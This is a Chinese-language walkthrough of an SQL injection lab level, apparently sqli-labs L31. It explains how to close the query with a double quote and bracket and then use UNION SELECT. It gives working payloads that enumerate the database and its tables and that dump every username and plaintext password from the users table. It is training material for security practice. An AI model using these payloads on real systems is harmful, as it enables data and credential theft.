2. 核心原理：社会工程学与闭合符匹配

本关卡延续了 L29、L30 的“心理战”风格。页面大写着 "This Site Protected by World's Best WAF"，但实际上后台没有任何安全过滤代码，属于纯粹的视觉欺骗。

根据源码审计，后台的 SQL 语句为 id=("$id")，因此需要采用 双引号加右括号 ") 进行闭合，随后即可使用标准的联合查询。

3. 操作步骤与解析

第一步：探测回显点

输入 URL：?id=-1") union select 1,2,3 --+

回显现象：页面正常显示数字 2 和 3，确认存在联合查询回显点。

第二步：爆库名与表名

输入 URL：?id=-1") union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database() --+

回显现象：页面显示当前库名 security 以及表名 emails,referrers,uagents,users。

第三步：直接脱库

输入 URL：?id=-1") union select 1,group_concat(username),group_concat(password) from users --+

回显现象：页面直接爆出所有用户的账号和明文密码，包括 admin:p@ssw0rd 以及历史遗留的测试账号。

4. 踩坑记录与复盘

  • 切勿被前端欺骗：在实战中，带有“安全防护”、“已拦截”等字眼的页面可能是伪造的。必须通过发包（如构造 `UNION SELECT`）来验证实际防御机制。
  • 上下文闭合匹配：严格匹配后端的包裹符号，L31 为双引号加括号，缺一不可。

5. 知识点总结

  • 黑盒测试思维：不要依赖视觉层面的文字提示，一切以实际返回的 SQL 执行结果为准。
